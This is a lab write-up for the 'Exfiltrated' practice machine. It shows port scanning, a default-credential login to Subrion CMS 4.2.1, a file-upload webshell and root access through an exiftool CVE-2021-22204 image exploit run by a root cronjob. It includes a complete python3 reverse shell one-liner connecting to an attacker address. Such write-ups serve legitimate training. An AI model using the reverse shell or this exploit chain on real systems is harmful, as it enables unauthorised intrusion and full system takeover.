# Exfiltrated

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.175.163
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 18:24 +08
Nmap scan report for 192.168.175.163
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Did a detailed `nmap` scan to enumerate for me as well:

```
$ sudo nmap -p 22,80 -sC -sV -O -T4 192.168.175.163                         
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 18:27 +08
Nmap scan report for 192.168.175.163
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
```

So there's a `/panel` directory present, and we can enumerate that first:

### Default Creds -> Subrion RCE

The `/panel` directory shows us a basic login page:

<figure><img src="../../../.gitbook/assets/image (3074).png" alt=""><figcaption></figcaption></figure>

We can login with `admin:admin`. This software was Subrion CMS v4.2.1, which had a few public exploits:

```
$ searchsploit subrion 4.2.1
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting    | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                     | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                  | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                   | php/webapps/45150.txt
----------------------------------------------------------- ---------------------------------
```

We can use the Arbitrary File Upload to get a webshell on the machine:

<figure><img src="../../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

From here, we can easily convert this to a reverse shell on our machine using a `python3` reverse shell.&#x20;

{% code overflow="wrap" %}
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.164",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2566).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob -> Exiftool RCE

I ran `linpeas.sh` on the machine to enumerate for me, and it picked up on cronjobs running as the `root` user:

<figure><img src="../../../.gitbook/assets/image (1506).png" alt=""><figcaption></figcaption></figure>

Here's the content of the file:

```bash
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

This program uses `exiftool` to get the metadata of the image and redirects it to a file. We can find the version of `exiftool` being used here by using it on any file:

```
www-data@exfiltrated:/opt$ exiftool image-exif.sh 
ExifTool Version Number         : 11.88
File Name                       : image-exif.sh
Directory                       : .
File Size                       : 437 bytes
File Modification Date/Time     : 2021:06:10 12:06:15+00:00
File Access Date/Time           : 2023:07:01 10:24:06+00:00
File Inode Change Date/Time     : 2021:08:27 12:33:35+00:00
File Permissions                : rwxr-xr-x
File Type                       : bash script
File Type Extension             : sh
MIME Type                       : text/x-bash
```

This version is vulnerable to an RCE exploit by injecting code within the image. When `exiftool` is run on the malicious image, code would be executed as well. Since we can write to the `/var/www/html/subrion/uploads` directory, this means that we just need to create and put a malicious `.jpg` file there.

Here's a repository that can be used:

{% embed url="https://github.com/convisolabs/CVE-2021-22204-exiftool" %}

We just need to edit `exploit.py` to have the relevant IP address and port. Afterwards, we can grab any sample image and run the exploit to update it with the payload:

```
$ python3 exploit.py
    1 image files updated
```

Afterwards, transfer it to the `/var/www/html/subrion/uploads` directory and wait for a bit. Once the cronjob runs, we will get a reverse shell as `root`:

<figure><img src="../../../.gitbook/assets/image (2676).png" alt=""><figcaption></figcaption></figure>

Rooted!
